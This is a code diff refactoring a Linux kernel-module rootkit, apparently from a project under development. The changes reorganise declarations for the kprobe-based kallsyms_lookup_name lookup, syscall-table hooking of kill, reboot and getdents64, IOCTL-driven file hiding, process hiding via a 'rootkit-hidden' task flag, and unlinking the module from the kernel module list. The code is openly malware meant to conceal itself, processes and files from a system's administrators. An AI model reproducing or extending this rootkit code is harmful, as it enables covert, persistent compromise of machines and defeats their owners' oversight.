@@ -18,6 +18,8 @@
 // across kernel versions.
 #include <linux/string.h>
 #include <linux/mutex.h>
+// kprobe for kallsyms_lookup_name
+#include <linux/kprobes.h>
 
 #include "loadable_kernel_module.h"
 
@@ -25,12 +27,6 @@
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 18, 0)
 #define PROC_ROOT_INO PROCFS_ROOT_INO
 #endif
-
-// kprobe for kallsyms_lookup_name
-#include <linux/kprobes.h>
-static struct kprobe kp = {
-	    .symbol_name = "kallsyms_lookup_name"
-};
 
 #define OURMODNAME "loadable_kernel_module"
 // Custom flag stored in task_struct->flags to mark a process as rootkit-hidden.
@@ -92,12 +88,15 @@ static int change_process_name(const char *orig_name, const char *new_name) {
     return found ? 0 : -1;
 }
 
+/* ---- character device state ---- */
 static int major;
 // Holds the full major/minor-encoded dev_t returned by alloc_chrdev_region,
 // so lkm_exit can unregister the exact same region (unregister_chrdev_region
 // takes a dev_t, not a bare major number).
 static dev_t lkm_dev_no;
 struct cdev *kernel_cdev;
+
+/* ---- file hiding state ---- */
 // Points to a static empty string initially; replaced by a kmalloc'd buffer in IOCTL_FILE_HIDE.
 // The empty-string sentinel is checked via *HIDDEN_FILE != '\0' before kfree — do not set to NULL.
 char *HIDDEN_FILE = "";
@@ -106,7 +105,11 @@ char *HIDDEN_FILE = "";
 // can run while the reader still holds the stale pointer (use-after-free).
 static DEFINE_MUTEX(hidden_file_lock);
 
-// the necessary variables that the syscall table requires to access and modify 
+/* ---- syscall table / hooking infrastructure ---- */
+static struct kprobe kp = {
+	    .symbol_name = "kallsyms_lookup_name"
+};
+// the necessary variables that the syscall table requires to access and modify
 static unsigned long *__sys_call_table;
 void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
 unsigned long start_rodata;
@@ -120,6 +123,14 @@ typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
 static t_syscall orig_kill;
 static t_syscall orig_reboot;
 static t_syscall orig_getdents64;
+
+/* ---- module hide state ---- */
+static struct list_head *prev_module;
+static short hidden = 0;
+// Serializes module_hide()/module_show() against each other: without this, two
+// concurrent IOCTL_MOD_HIDE calls can both observe the same stale `hidden` value
+// and both call list_del()/list_add() on THIS_MODULE->list, corrupting it.
+static DEFINE_MUTEX(module_hide_lock);
 
 // Syscall hook Part
 static asmlinkage int hacked_reboot(const struct pt_regs *pt_regs) 
@@ -227,12 +238,6 @@ out:
 }
 
 // hidden module part
-static struct list_head *prev_module;
-static short hidden = 0;
-// Serializes module_hide()/module_show() against each other: without this, two
-// concurrent IOCTL_MOD_HIDE calls can both observe the same stale `hidden` value
-// and both call list_del()/list_add() on THIS_MODULE->list, corrupting it.
-static DEFINE_MUTEX(module_hide_lock);
 static void module_show(void)
 {
     /* back to the module list where we remove before */
